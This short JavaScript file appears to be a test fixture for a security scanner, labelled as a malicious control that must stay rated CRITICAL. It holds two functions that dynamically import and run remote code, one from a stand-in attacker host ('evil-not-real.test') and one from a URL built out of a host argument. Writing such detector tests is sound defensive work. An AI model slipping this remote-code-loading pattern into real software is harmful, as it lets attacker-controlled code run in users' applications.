// Malicious control (gate#2 positive): computed imports WITH remote evidence — must stay CRITICAL
// (the downgrade-only gate must not drop these to HIGH).
//  - import(C2) where C2 resolves to an https:// URL string literal
//  - import(`https://${host}/p.js`) — TemplateLiteral with an explicit URL scheme
const C2 = 'https://cdn.evil-not-real.test/payload.js';

export async function pull() {
  return await import(C2);
}

export async function fetchPull(host) {
  return await import(`https://${host}/p.js`);
}
